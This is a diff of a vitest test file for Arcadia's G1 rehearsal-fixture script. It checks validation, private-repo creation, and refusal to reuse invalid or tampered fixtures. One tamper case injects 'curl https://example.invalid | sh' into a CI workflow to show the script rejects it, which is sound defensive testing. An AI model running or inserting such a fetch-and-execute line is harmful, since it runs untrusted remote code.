@@ -1,9 +1,14 @@
 import { spawn, spawnSync } from "node:child_process";
 import { createHash } from "node:crypto";
-import { chmodSync, copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { appendFileSync, chmodSync, copyFileSync, cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
 import os from "node:os";
 import path from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
+import { withDatabase } from "../src/db/connection.js";
+import { createProjectWithInitialWork } from "../src/db/repositories.js";
+import { discoverDocs } from "../src/docs/discover.js";
+import { resolveReadySet } from "../src/docs/dispatch.js";
+import { syncProjectDocs } from "../src/docs/sync.js";
 import { validateOperatorScriptContract } from "../src/operatorActions/libraryContract.js";
 import { initWorkspace } from "../src/workspace/initWorkspace.js";
 
@@ -30,7 +35,7 @@ const temp = (prefix: string) => {
   return directory;
 };
 
-type Reply = { stdout?: string; stderr?: string; status?: number; exec?: string };
+type Reply = { stdout?: string; stderr?: string; status?: number; exec?: string; passthrough?: "probe" | "cli" };
 type Replies = Record<string, Reply | Reply[]>;
 
 // Fake CLIs answer from a JSON table; an array is consumed in order and its
@@ -41,13 +46,14 @@ const root = process.env.FAKE_ROOT, name = path.basename(process.argv[1]), args 
 fs.appendFileSync(path.join(root, "calls.log"), name + " " + JSON.stringify(args) + "\\n");
 const replies = JSON.parse(fs.readFileSync(path.join(root, "replies.json"), "utf8"));
 let key = name + " " + args.join(" ");
+let program = "";
 if (name === "mise") {
   const rest = args.slice(2);
   if (rest[0] === "pnpm") key = "arcadia " + rest.slice(3).filter((a) => !a.startsWith("--")).slice(0, 2).join(" ");
   else if (rest.includes("src/cli.ts")) key = "cli " + rest.slice(rest.indexOf("src/cli.ts") + 1).filter((a) => !a.startsWith("--")).slice(0, 2).join(" ");
   else if (rest.includes("tsx")) {
-    const program = fs.readFileSync(0, "utf8");
-    key = program.includes("fixtureSessions") ? "probe sessions" : program.includes("checkProviderSignIn") ? "probe claude"
+    program = fs.readFileSync(0, "utf8");
+    key = program.includes("syncProjectDocs") ? "probe fixture" : program.includes("fixtureSessions") ? "probe sessions" : program.includes("checkProviderSignIn") ? "probe claude"
       : program.includes("observeProviderCapacity") ? "probe capacity" : "probe leases";
   } else key = "node preflight";
 }
@@ -62,6 +68,20 @@ if (Array.isArray(reply)) {
 // "{{arg:--flag}}" in a reply is replaced by the value that followed --flag.
 // "exec" answers with the output of a shell command run at call time.
 if (reply.exec) reply = { ...reply, stdout: require("child_process").execSync(reply.exec, { encoding: "utf8" }) };
+// "passthrough" runs the real Arcadia code from this checkout instead of a canned answer:
+// "probe" runs the stdin program, "cli" runs the real CLI against the box's throwaway workspace.
+if (reply.passthrough) {
+  const env = { ...process.env };
+  delete env.VITEST;
+  const real = process.env.FAKE_ARCADIA_ROOT;
+  const argv = reply.passthrough === "probe"
+    ? ["--import", "tsx", "--input-type=module", "-", ...args.slice(args.indexOf("-") + 1)]
+    : ["--import", "tsx", path.join(real, "src", "cli.ts"), ...args.slice(args.indexOf("arcadia") + 1), "--workspace", process.env.FAKE_WORKSPACE];
+  const run = require("child_process").spawnSync(process.execPath, argv, { cwd: real, input: program, env, encoding: "utf8", timeout: 60000 });
+  process.stdout.write(run.stdout || "");
+  process.stderr.write(run.stderr || "");
+  process.exit(run.status === null ? 98 : run.status);
+}
 if (reply.stdout) process.stdout.write(reply.stdout.replace(/[{][{]arg:([^}]+)[}][}]/g, (_m, flag) => args[args.indexOf(flag) + 1] ?? ""));
 if (reply.stderr) process.stderr.write(reply.stderr);
 process.exit(reply.status ?? 0);
@@ -116,8 +136,10 @@ function sandboxFor(id: string, replies: Replies, extraLibraryFiles: Record<stri
   writeFileSync(path.join(root, "replies.json"), JSON.stringify(replies));
   writeFileSync(path.join(root, "calls.log"), "");
   const run = (env: Record<string, string | undefined> = {}, args = ["run"]) => {
-    const childEnv: Record<string, string | undefined> = { ...process.env, PATH: `${bin}:${process.env.PATH}`, HOME: home, FAKE_ROOT: root, ...env };
-    for (const key of ["CODEX_SANDBOX", "ARCADIA_OPERATOR_SCRIPT_ID", "ARCADIA_OPERATOR_SCRIPT_DESCRIPTOR", "ANTHROPIC_API_KEY", "ARCADIA_REHEARSAL_GITHUB_REPO"]) {
+    const childEnv: Record<string, string | undefined> = {
+      ...process.env, PATH: `${bin}:${process.env.PATH}`, HOME: home, FAKE_ROOT: root, FAKE_ARCADIA_ROOT: repoRoot, FAKE_WORKSPACE: path.join(root, "workspace"), ...env
+    };
+    for (const key of ["CODEX_SANDBOX", "ARCADIA_OPERATOR_SCRIPT_ID", "ARCADIA_OPERATOR_SCRIPT_DESCRIPTOR", "ANTHROPIC_API_KEY", "ARCADIA_REHEARSAL_GITHUB_REPO", "ARCADIA_WORKSPACE"]) {
       if (!(key in env)) delete childEnv[key];
     }
     return spawnSync("bash", [path.join(scripts, `${id}.sh`), ...args], { env: childEnv, encoding: "utf8", timeout: 60_000 });
@@ -227,6 +249,8 @@ describe("G1 fixture preparation refuses unsafe or missing input with a receipt"
   const ready = (repoView: Reply, extra: Replies = {}): Replies => ({
     "arcadia production status": status("inactive"),
     "arcadia workspace resolve": { stdout: JSON.stringify({ ok: true, data: { source: "user config", workspacePath: "/w/martianrover" } }) },
+    "probe fixture": { passthrough: "probe" },
+    "arcadia project list": ok({ projects: [] }),
     "gh api user": { stdout: "pmark\n" },
     "gh repo view": repoView,
     ...extra
@@ -893,19 +917,105 @@ describe("G8 proves terminal Off through the reviewed restart and reconciles com
   });
 });
 
+// ---------------------------------------------------------------------------
+// G1's generated fixture, judged by Arcadia's own code. The fixture is rendered
+// from the script's own heredocs (its constants and `render_fixture`), never
+// from a copy in this test, so a defect in the script's bytes is what fails.
+
+const PRE_FIX_CRITERION = '      - "$VALIDATION_COMMAND" passes.';
+const FIXED_CRITERION = "      - The genesis check $VALIDATION_COMMAND passes.";
+function renderG1Fixture(directory: string, script = source(G1), repository = FIXTURE_REPO_ID, date = "2026-10-04") {
+  const constants = script.slice(0, script.indexOf('case "${1:-run}" in')).split("\n").filter((line) => /^[A-Z_]+=/.test(line) && !line.includes("$(")).join("\n");
+  const end = "} # end render_fixture";
+  const start = script.indexOf("render_fixture() {");
+  expect(start, "G1 defines render_fixture").toBeGreaterThan(-1);
+  expect(script.indexOf(end), "G1 closes render_fixture").toBeGreaterThan(start);
+  const program = [constants, `REPO=${JSON.stringify(repository)}`, `FIXTURE_DATE=${date}`, script.slice(start, script.indexOf(end) + end.length), `render_fixture ${JSON.stringify(directory)}`].join("\n");
+  const run = spawnSync("bash", ["-c", program], { encoding: "utf8" });
+  expect(run.status, run.stderr).toBe(0);
+  return directory;
+}
+const ACTIONS = ["write-start-marker", "transform-start-marker", "verify-final-rehearsal"];
+const g1ValidationRules = () => {
+  const text = source(G1);
+  const marker = "VALIDATION_RULES='";
+  const start = text.indexOf(marker) + marker.length;
+  return text.slice(start, text.indexOf("'\n", start));
+};
+/** The script's own validation probe and rules, run for real against one directory. */
+function g1Validation(directory: string) {
+  const program = source(G1).split(`cat > "$RUN_DIR/validate-fixture.mjs" <<'NODE'\n`)[1].split("\nNODE")[0];
+  const env: NodeJS.ProcessEnv = { ...process.env };
+  delete env.VITEST;
+  const probe = spawnSync(process.execPath, ["--import", "tsx", "--input-type=module", "-", directory, path.join(temp("arcadia-g1-validation-"), "workspace"), "Three Action Rehearsal", "autonomous-three-action-rehearsal"], { cwd: repoRoot, input: program, env, encoding: "utf8", timeout: 60_000 });
+  expect(probe.status, probe.stderr).toBe(0);
+  const verdict = spawnSync("jq", ["-r", "--arg", "p", "three-action-rehearsal", "--arg", "plan", "autonomous-three-action-rehearsal", "--arg", "a", ACTIONS[0], "--arg", "b", ACTIONS[1], "--arg", "c", ACTIONS[2], g1ValidationRules()], { input: probe.stdout, encoding: "utf8" });
+  expect(verdict.status, verdict.stderr).toBe(0);
+  return { output: JSON.parse(probe.stdout), problem: verdict.stdout.trim() };
+}
+
+describe("G1's generated fixture passes Arcadia's own discovery and docs-sync validation", () => {
+  it("renders from the script's heredocs with zero docs-sync errors and the three Actions serial by depends_on", () => {
+    const fixture = renderG1Fixture(path.join(temp("arcadia-g1-render-"), "fixture"));
+    // Arcadia's real parser, exactly as docs sync calls it: no faked errorCount.
+    const discovered = discoverDocs(fixture);
+    expect(discovered.errors).toEqual([]);
+    expect(discovered.rejected).toEqual([]);
+    const plan = discovered.docs.find((doc) => doc.type === "plan");
+    expect(plan?.type === "plan" && plan.actions.map((action) => [action.id, action.dependsOn])).toEqual([[ACTIONS[0], []], [ACTIONS[1], [ACTIONS[0]]], [ACTIONS[2], [ACTIONS[1]]]]);
+    expect(plan?.type === "plan" && plan.actions[0].acceptanceCriteria).toContain("The genesis check node scripts/check-rehearsal.mjs passes.");
+    // The same dry-run syncProjectDocs that `docs sync` runs per Project, in a throwaway workspace.
+    const workspace = path.join(temp("arcadia-g1-sync-"), "workspace");
+    initWorkspace(workspace);
+    const sync = withDatabase(workspace, (db) => {
+      const { project } = createProjectWithInitialWork(db, { name: "Three Action Rehearsal", mission: "m", goal: "g", status: "active", currentMilestone: "m", nextAction: "n", workClassification: "agent" });
+      expect(project.slug).toBe("three-action-rehearsal");
+      return syncProjectDocs(db, project, { apply: false, repoRoot: fixture });
+    });
+    expect(sync.errors).toEqual([]);
+    expect(sync.rejected).toEqual([]);
+    const readySet = resolveReadySet(fixture, "three-action-rehearsal");
+    expect(readySet.ready.map((entry) => entry.actionId)).toEqual([ACTIONS[0]]);
+    for (const candidate of readySet.candidates.slice(1)) {
+      expect(candidate).toMatchObject({ ready: false, gate: null });
+      expect(candidate.blockers.length).toBeGreaterThan(0);
+      expect(candidate.blockers.every((blocker) => blocker.field.endsWith(".depends_on"))).toBe(true);
+    }
+    // And G1's own validation probe and rules agree.
+    const { output, problem } = g1Validation(fixture);
+    expect(output).toMatchObject({ importSlug: "three-action-rehearsal", errorCount: 0, ready: [ACTIONS[0]] });
+    expect(problem).toBe("");
+  });
+
+  it("G1's validation names the invalid YAML criterion the pre-validation draft wrote", () => {
+    expect(source(G1)).toContain(FIXED_CRITERION);
+    const fixture = renderG1Fixture(path.join(temp("arcadia-g1-render-"), "fixture"), source(G1).replace(FIXED_CRITERION, PRE_FIX_CRITERION));
+    expect(discoverDocs(fixture).errors.map((error) => error.message).join("\n")).toContain("Invalid YAML");
+    const { output, problem } = g1Validation(fixture);
+    expect(output.errorCount).toBeGreaterThan(0);
+    expect(problem).toContain("Invalid YAML");
+    expect(problem).toContain("not exactly [write-start-marker]");
+  });
+});
+
 describe("G1 creates only the named private repository and reuses it only at genesis", () => {
   const REPO = "pmark/arcadia-three-action-rehearsal-t1";
   const ROOT_EXEC = 'git -C "$HOME/tmp/arcadia-three-action-rehearsal" rev-list --max-parents=0 HEAD';
-  const workItems = ["write-start-marker", "transform-start-marker", "verify-final-rehearsal"].map((a, i) => ({ id: `work_${i}`, doc_ref: `plan/autonomous-three-action-rehearsal#${a}` }));
+  // Arcadia's validation, Project registry, metadata, docs sync and work list are the real code,
+  // against the box's throwaway workspace; only GitHub, production status, the workspace
+  // resolution and packet seeding are canned.
   const common = (): Replies => ({
     "arcadia production status": status("inactive"),
     "arcadia workspace resolve": { stdout: JSON.stringify({ ok: true, data: { source: "user config", workspacePath: "/w/martianrover" } }) },
+    "probe fixture": { passthrough: "probe" },
+    "arcadia project list": { passthrough: "cli" },
+    "arcadia project import": { passthrough: "cli" },
+    "arcadia project metadata": { passthrough: "cli" },
+    "arcadia docs sync": { passthrough: "cli" },
+    "arcadia work list": { passthrough: "cli" },
     "gh api user": { stdout: "pmark\n" },
     "gh config get git_protocol": { stdout: "https\n" },
     [`gh api repos/${REPO}/commits/main`]: { exec: ROOT_EXEC },
-    "arcadia project metadata": ok({}),
-    "arcadia docs sync": ok({ errorCount: 0 }),
-    "arcadia work list": ok({ workItems }),
     "arcadia work plan": ok({ buildApproval: { id: "review_1" } }),
     "arcadia review show": ok({ item: { status: "open" } })
   });
@@ -914,19 +1024,62 @@ describe("G1 creates only the named private repository and reuses it only at gen
     writeFileSync(path.join(box.root, "replies.json"), JSON.stringify(replies));
     writeFileSync(path.join(box.root, "calls.log"), "");
   };
+  // The throwaway checkout carries its own managed PROJECT.md, as the real one does, so discovery
+  // over it after a run proves nothing G1 leaves under runs/ is found (or sorted ahead of it).
+  const CHECKOUT_PROJECT = "---\narcadia: v1\ntype: project\nslug: arcadia\nname: Arcadia\nstatus: active\ngoal: Checkout under test.\noutcome: Checkout under test.\nmilestone: Test\nupdated: 2026-10-04\n---\n\n# Arcadia\n";
+  const g1Box = () => {
+    const box = sandboxFor(G1, {});
+    writeFileSync(path.join(box.checkout, "PROJECT.md"), CHECKOUT_PROJECT);
+    commitAll(box.checkout, "project");
+    git(box.checkout, ["push", "-q", "origin", "main"]);
+    initWorkspace(path.join(box.root, "workspace"));
+    return box;
+  };
+  const checkoutDiscovers = (box: ReturnType<typeof sandboxFor>) => discoverDocs(box.checkout).docs.map((doc) => doc.relativePath);
+  const expectOnlyCheckoutDocs = (box: ReturnType<typeof sandboxFor>) => {
+    expect(box.runDirs().length).toBeGreaterThan(0);
+    expect(checkoutDiscovers(box)).toEqual(["PROJECT.md"]);
+    expect(discoverDocs(box.checkout).errors).toEqual([]);
+  };
+  const notFound = { status: 1, stderr: `GraphQL: Could not resolve to a Repository with the name '${REPO}'.` };
+  const fixtureOf = (box: ReturnType<typeof sandboxFor>) => path.join(box.home, "tmp", "arcadia-three-action-rehearsal");
+  const noMutation = (box: ReturnType<typeof sandboxFor>) => {
+    expect(box.calls()).not.toMatch(/"repo","create"|^git .*push/m);
+    expect(arcadiaCallsFor(box, "project", "import")).toHaveLength(0);
+    expect(arcadiaCallsFor(box, "project", "metadata")).toHaveLength(0);
+    expect(arcadiaCallsFor(box, "docs", "sync")).toHaveLength(0);
+  };
 
   it("creates the repository private, pushes only genesis without force, registers the fixture, then reuses it at genesis", () => {
-    const box = sandboxFor(G1, {});
+    const box = g1Box();
     setReplies(box, {
       ...common(),
-      "gh repo view": [{ status: 1, stderr: `GraphQL: Could not resolve to a Repository with the name '${REPO}'.` }, { stdout: JSON.stringify({ visibility: "PRIVATE", isPrivate: true, isEmpty: true }) }],
-      "gh repo create": { stdout: "" },
-      "arcadia project list": ok({ projects: [] }),
-      "arcadia project import": ok({ project: { id: "proj_1", slug: "three-action-rehearsal" } })
+      "gh repo view": [notFound, { stdout: JSON.stringify({ visibility: "PRIVATE", isPrivate: true, isEmpty: true }) }],
+      "gh repo create": { stdout: "" }
     });
     const first = box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO });
     expect(first.status, first.stdout + first.stderr).toBe(0);
-    expect(box.receipt().json).toMatchObject({ outcome: "succeeded", githubRepository: REPO, githubRepositoryCreated: true, githubRepositoryChanged: true, productionPreviewedOrActivated: false, projectId: "proj_1", firstPacketApproval: "review_1" });
+    const { dir: firstDir, json: firstReceipt } = box.receipt();
+    expectOnlyCheckoutDocs(box);
+    expect(firstReceipt).toMatchObject({ outcome: "succeeded", githubRepository: REPO, githubRepositoryCreated: true, githubRepositoryChanged: true, productionPreviewedOrActivated: false, registrationState: "none", firstPacketApproval: "review_1" });
+    const fixture = fixtureOf(box);
+    expect(firstReceipt.projectId).toBe(readFileSync(path.join(fixture, ".git", "arcadia-three-action-project-id"), "utf8").trim());
+    // The real docs sync applied the fixture with zero errors.
+    expect(JSON.parse(readFileSync(path.join(firstDir, "docs-sync.json"), "utf8")).data.errorCount).toBe(0);
+    const recover = `ARCADIA_WORKSPACE=/w/martianrover ${realpathSync(box.scripts)}/recover-arcadia-host-services.sh run`;
+    expect(firstReceipt.recoverCommand).toBe(recover);
+    expect(first.stdout).toContain(`  ${recover}\n`);
+    expect(first.stdout).toMatch(/never exported/);
+    // Validation ran before any GitHub call, create, push or import.
+    const sequence = box.calls().trim().split("\n").map((line) => line.startsWith("git ") ? "push" : line.includes('"tsx"') ? "validate" : line.startsWith("gh ") ? "gh" : line.includes('"import"') ? "import" : "other");
+    expect(sequence.indexOf("validate")).toBeGreaterThan(-1);
+    expect(sequence.indexOf("validate")).toBeLessThan(sequence.indexOf("gh"));
+    expect(sequence.indexOf("gh")).toBeLessThan(sequence.indexOf("push"));
+    expect(sequence.indexOf("push")).toBeLessThan(sequence.indexOf("import"));
+    // The committed fixture is byte-for-byte the validated scratch render.
+    for (const file of ["PROJECT.md", "docs/plans/autonomous-three-action-rehearsal.md", ".arcadia-three-action-rehearsal.json"]) {
+      expect(readFileSync(path.join(fixture, file), "utf8")).toBe(readFileSync(path.join(firstDir, ".fixture-render", file), "utf8"));
+    }
     const calls = parsedCalls(box);
     const creates = calls.filter((c) => c.tool === "gh" && c.args[0] === "repo" && c.args[1] === "create");
     expect(creates).toHaveLength(1);
@@ -938,7 +1091,6 @@ describe("G1 creates only the named private repository and reuses it only at gen
     expect(pushes[0]).not.toMatch(/--force|\s-f\b/);
     expect(box.calls()).not.toMatch(/production","(preview|activate)/);
 
-    const fixture = path.join(box.home, "tmp", "arcadia-three-action-rehearsal");
     expect(git(fixture, ["remote", "get-url", "origin"])).toBe(`https://github.com/${REPO}.git`);
     expect(git(fixture, ["rev-list", "--count", "HEAD"])).toBe("1");
     expect(git(fixture, ["ls-files"]).split("\n").sort()).toEqual([
@@ -965,20 +1117,151 @@ describe("G1 creates only the named private repository and reuses it only at gen
     // Rerun with the same identifier: the repository now holds exactly this genesis.
     setReplies(box, {
       ...common(),
-      "gh repo view": { stdout: JSON.stringify({ name: "arcadia-three-action-rehearsal-t1", owner: { login: "pmark" }, visibility: "PRIVATE", isPrivate: true, isArchived: false, isFork: false, isEmpty: false, description }) },
-      "arcadia project list": ok({ projects: [{ id: "proj_1", slug: "three-action-rehearsal" }] })
+      "gh repo view": { stdout: JSON.stringify({ name: "arcadia-three-action-rehearsal-t1", owner: { login: "pmark" }, visibility: "PRIVATE", isPrivate: true, isArchived: false, isFork: false, isEmpty: false, description }) }
     });
     const second = box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO });
     expect(second.status, second.stdout + second.stderr).toBe(0);
     const [, secondDir] = box.runDirs().sort();
-    expect(JSON.parse(readFileSync(path.join(secondDir, "receipt.json"), "utf8"))).toMatchObject({ outcome: "succeeded", githubRepositoryCreated: false, githubRepositoryChanged: false });
+    expect(JSON.parse(readFileSync(path.join(secondDir, "receipt.json"), "utf8"))).toMatchObject({ outcome: "succeeded", githubRepositoryCreated: false, githubRepositoryChanged: false, registrationState: "registered_by_this_fixture", projectId: firstReceipt.projectId });
     expect(box.calls()).not.toMatch(/"repo","create"|^git .*push/m);
     expect(arcadiaCallsFor(box, "project", "import")).toHaveLength(0);
     expect(arcadiaCallsFor(box, "work", "plan")).toHaveLength(0);
+    expectOnlyCheckoutDocs(box);
+  });
+
+  it("refuses an invalid generated Plan with a receipt and failure handoff before any GitHub call, create, push, import or manifest write", () => {
+    const box = g1Box();
+    rebind(box, G1, [[new RegExp(FIXED_CRITERION.replace(/[$.]/g, "\\$&")), PRE_FIX_CRITERION]]);
+    setReplies(box, { ...common(), "gh repo view": notFound, "gh repo create": { stdout: "" } });
+    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
+    const { dir, json } = box.receipt();
+    expect(json).toMatchObject({ outcome: "refused", stage: "validate_fixture", githubRepositoryChanged: false, productionPreviewedOrActivated: false });
+    expect(json.reason).toContain("fails Arcadia's own discovery and docs-sync validation");
+    expect(json.reason).toContain("Invalid YAML");
+    expect(json.reason).not.toContain("\n");
+    expect(readFileSync(path.join(dir, "failure-handoff.md"), "utf8")).toContain("No GitHub repository was created or pushed by this run.");
+    expect(box.calls()).not.toMatch(/^gh /m);
+    noMutation(box);
+    expect(existsSync(fixtureOf(box))).toBe(false);
+    // The render a refusal leaves behind stays invisible to the checkout's own discovery...
+    expectOnlyCheckoutDocs(box);
+    // ...which it would not be at a non-dot path inside the run directory: there discovery finds
+    // the fixture's PROJECT.md and sorts it ahead of the checkout's own.
+    cpSync(path.join(dir, ".fixture-render"), path.join(dir, "fixture-render"), { recursive: true });
+    expect(checkoutDiscovers(box)[0]).toBe(path.relative(box.checkout, path.join(dir, "fixture-render", "PROJECT.md")));
+    rmSync(path.join(dir, "fixture-render"), { recursive: true });
+  });
+
+  it("reports a Project registered without this fixture's marker with an exact recovery instruction, before any GitHub call", () => {
+    const box = g1Box();
+    setReplies(box, { ...common(), "arcadia project list": ok({ projects: [{ id: "proj_9", slug: "three-action-rehearsal" }] }) });
+    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
+    const { dir, json } = box.receipt();
+    expect(json).toMatchObject({ outcome: "refused", stage: "registration_state", registrationState: "half_registered", registeredProjectId: "proj_9", githubRepositoryChanged: false });
+    expect(json.reason).toMatch(/^HALF-REGISTERED: Project three-action-rehearsal \(proj_9\) is already registered in \/w\/martianrover, but the local fixture .* is missing/);
+    expect(json.recovery).toContain(`move it back to ${fixtureOf(box)}`);
+    expect(json.recovery).toContain("arcadia project show proj_9 --json");
+    expect(json.recovery).toContain("Agent Ask proposal for a governed retirement");
+    const handoff = readFileSync(path.join(dir, "failure-handoff.md"), "utf8");
+    expect(handoff).toContain("## Recovery");
+    expect(handoff).toContain(json.recovery);
+    expect(box.calls()).not.toMatch(/^gh /m);
+    noMutation(box);
+  });
+
+  // An earlier G1 committed (and may have pushed and registered) this genesis; by default the
+  // pre-validation one with the invalid Plan.
+  function earlierFixture(box: ReturnType<typeof sandboxFor>, options: { projectId?: string; script?: string; date?: string; mutate?: (fixture: string) => void } = {}) {
+    const fixture = renderG1Fixture(fixtureOf(box), options.script ?? source(G1).replace(FIXED_CRITERION, PRE_FIX_CRITERION), REPO, options.date);
+    options.mutate?.(fixture);
+    git(fixture, ["init", "-q", "-b", "main"]);
+    const root = commitAll(fixture, "genesis");
+    git(fixture, ["remote", "add", "origin", `https://github.com/${REPO}.git`]);
+    if (options.projectId) writeFileSync(path.join(fixture, ".git", "arcadia-three-action-project-id"), `${options.projectId}\n`);
+    return { fixture, root };
+  }
+  const invalidEarlierFixture = (box: ReturnType<typeof sandboxFor>, projectId?: string) => earlierFixture(box, { projectId });
+
+  it("reports an earlier attempt registered from an invalid genesis Plan as half-registered, naming what exists and the recovery", () => {
+    const box = g1Box();
+    const { fixture, root } = invalidEarlierFixture(box, "proj_1");
+    setReplies(box, { ...common(), "arcadia project list": ok({ projects: [{ id: "proj_1", slug: "three-action-rehearsal" }] }) });
+    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
+    const { json } = box.receipt();
+    expect(json).toMatchObject({ outcome: "refused", stage: "registration_state", registrationState: "half_registered", githubRepositoryChanged: false });
+    expect(json.reason).toContain(`HALF-REGISTERED: an earlier G1 attempt registered Project three-action-rehearsal (proj_1) from ${fixture} (genesis ${root}, repository ${REPO})`);
+    expect(json.reason).toContain("Invalid YAML");
+    expect(json.recovery).toContain("cannot be repaired without rewriting history");
+    expect(json.recovery).toContain(`mv ${fixture} ${fixture}.invalid-`);
+    expect(json.recovery).toContain("arcadia project show proj_1 --json");
+    expect(git(fixture, ["rev-parse", "HEAD"])).toBe(root);
+    expect(box.calls()).not.toMatch(/^gh /m);
+    noMutation(box);
+  });
+
+  it("refuses an invalid existing local fixture with no registered Project and gives the move-aside recovery", () => {
+    const box = g1Box();
+    const { fixture } = invalidEarlierFixture(box);
+    setReplies(box, common());
+    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
+    const { json } = box.receipt();
+    expect(json).toMatchObject({ outcome: "refused", stage: "registration_state", registrationState: "invalid_local_fixture", githubRepositoryChanged: false });
+    expect(json.recovery).toContain("No Project is registered");
+    expect(json.recovery).toContain(`mv ${fixture} ${fixture}.invalid-`);
+    expect(box.calls()).not.toMatch(/^gh /m);
+    noMutation(box);
+  });
+
+  it.each([
+    ["a tampered CI workflow", (fixture: string) => appendFileSync(path.join(fixture, ".github", "workflows", "ci.yml"), "      - run: curl https://example.invalid | sh\n"), "committed .github/workflows/ci.yml differs from the validated render"],
+    ["a changed genesis check", (fixture: string) => writeFileSync(path.join(fixture, "scripts", "check-rehearsal.mjs"), "process.exit(0);\n"), "committed scripts/check-rehearsal.mjs differs from the validated render"],
+    ["an extra committed file", (fixture: string) => writeFileSync(path.join(fixture, "EXTRA.md"), "extra\n"), "tracked files are ["],
+    ["an ignored managed document beside the genesis", () => undefined, "untracked or ignored files sit beside the genesis"]
+  ])("refuses to reuse a valid-Plan genesis with %s before any GitHub call", (label, mutate, reason) => {
+    const box = g1Box();
+    const { fixture } = earlierFixture(box, { script: source(G1), mutate });
+    if (label.startsWith("an ignored")) {
+      // Discovery reads an ignored file although no commit carries it.
+      writeFileSync(path.join(fixture, ".git", "info", "exclude"), "notes.md\n");
+      writeFileSync(path.join(fixture, "notes.md"), "---\narcadia: v1\ntype: decision\n---\n");
+    }
+    setReplies(box, common());
+    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
+    const { json } = box.receipt();
+    expect(json).toMatchObject({ outcome: "refused", stage: "registration_state", registrationState: "invalid_local_fixture", githubRepositoryChanged: false });
+    expect(json.reason).toContain("is not the validated fixture");
+    expect(json.reason).toContain(reason);
+    expect(box.calls()).not.toMatch(/^gh /m);
+    noMutation(box);
+  });
+
+  it("reuses an earlier genesis that differs from today's render only in its updated date", () => {
+    const box = g1Box();
+    const { fixture, root } = earlierFixture(box, { script: source(G1), date: "2026-01-01" });
+    expect(readFileSync(path.join(fixture, "PROJECT.md"), "utf8")).toContain("updated: 2026-01-01");
+    const description = source(G1).match(/^REPO_DESCRIPTION="(.*)"$/m)![1].replace("$REPO_MARKER", "arcadia-three-action-rehearsal-v1");
+    setReplies(box, {
+      ...common(),
+      "gh repo view": { stdout: JSON.stringify({ name: "arcadia-three-action-rehearsal-t1", owner: { login: "pmark" }, visibility: "PRIVATE", isPrivate: true, isArchived: false, isFork: false, isEmpty: false, description }) }
+    });
+    const result = box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO });
+    expect(result.status, result.stdout + result.stderr).toBe(0);
+    expect(box.receipt().json).toMatchObject({ outcome: "succeeded", rootCommit: root, githubRepositoryChanged: false });
+    expect(box.calls()).not.toMatch(/"repo","create"|^git .*push/m);
+    expectOnlyCheckoutDocs(box);
+  });
+
+  it("refuses an exported ARCADIA_WORKSPACE by name before resolving the workspace", () => {
+    const box = g1Box();
+    setReplies(box, common());
+    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO, ARCADIA_WORKSPACE: "/w/martianrover" }).status).not.toBe(0);
+    expect(box.receipt().json).toMatchObject({ outcome: "refused", stage: "preflight" });
+    expect(box.receipt().json.reason).toContain("unset ARCADIA_WORKSPACE");
+    expect(arcadiaCallsFor(box, "workspace", "resolve")).toHaveLength(0);
   });
 
   it("refuses an existing local fixture wired to another remote before any GitHub mutation", () => {
-    const box = sandboxFor(G1, {});
+    const box = g1Box();
     const { fixture } = createFixture(box.home);
     git(fixture, ["remote", "set-url", "origin", "https://github.com/pmark/arcadia-three-action-rehearsal-other.git"]);
     setReplies(box, common());
@@ -989,10 +1272,12 @@ describe("G1 creates only the named private repository and reuses it only at gen
 });
 
 describe("G6 preflight passes only when every observation is current, included and available", () => {
-  it("binds the receipt G7 needs when every check passes", () => {
+  const passingCapacity = { admitted: true, unattendedProof: true, freshness: "fresh", confidence: "observed", usagePolicy: "included", evidence: "real", availability: "available" };
+  function passingBox(patch: (repo: string, root: string, boxRoot: string) => Replies = () => ({})) {
     const box = sandboxFor(G6, {});
     const head = git(box.checkout, ["rev-parse", "HEAD"]);
-    rebind(box, G6, [[/REQUIRED_COMMITS="[^"]+"/, `REQUIRED_COMMITS="${head}"`]]);
+    // A zero-second check wait keeps the bounded loop to one read; nothing relies on the fake `sleep`.
+    rebind(box, G6, [[/REQUIRED_COMMITS="[^"]+"/, `REQUIRED_COMMITS="${head}"`], [/^CHECK_WAIT_SECONDS=300$/m, "CHECK_WAIT_SECONDS=0"]]);
     const { root } = createFixture(box.home);
     const repo = FIXTURE_REPO_ID;
     writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({
@@ -1002,19 +1287,66 @@ describe("G6 preflight passes only when every observation is current, included a
       "arcadia worker status": { stdout: "Worker: running (PID 7)\n" },
       "probe leases": { stdout: JSON.stringify({ active: 0, fixtureActive: [] }) },
       "probe claude": { stdout: JSON.stringify({ verdict: "signed_in" }) },
-      "probe capacity": { stdout: JSON.stringify({ readOnlyReviewers: ["codex_planning"], codex: { admitted: true, unattendedProof: true, freshness: "fresh", confidence: "observed", usagePolicy: "included", evidence: "observed", availability: "available" } }) },
+      "probe capacity": { stdout: JSON.stringify({ readOnlyReviewers: ["codex_planning"], codex: passingCapacity }) },
       "codex --version": { stdout: "codex 1.0\n" },
       "codex login status": { stdout: "Logged in using ChatGPT\n" },
       "gh auth status": { status: 0 },
       [`gh api repos/${repo}`]: { stdout: JSON.stringify({ private: true, archived: false, fork: false, default_branch: "main", permissions: { push: true } }) },
       [`gh api repos/${repo}/branches/main`]: { stdout: JSON.stringify({ commit: { sha: root }, protected: false }) },
-      [`gh api repos/${repo}/commits/${root}/check-runs`]: { stdout: JSON.stringify({ total_count: 1, check_runs: [{ status: "completed", conclusion: "success" }] }) }
+      [`gh api repos/${repo}/commits/${root}/check-runs`]: { stdout: JSON.stringify({ total_count: 1, check_runs: [{ status: "completed", conclusion: "success" }] }) },
+      ...patch(repo, root, box.root)
     }));
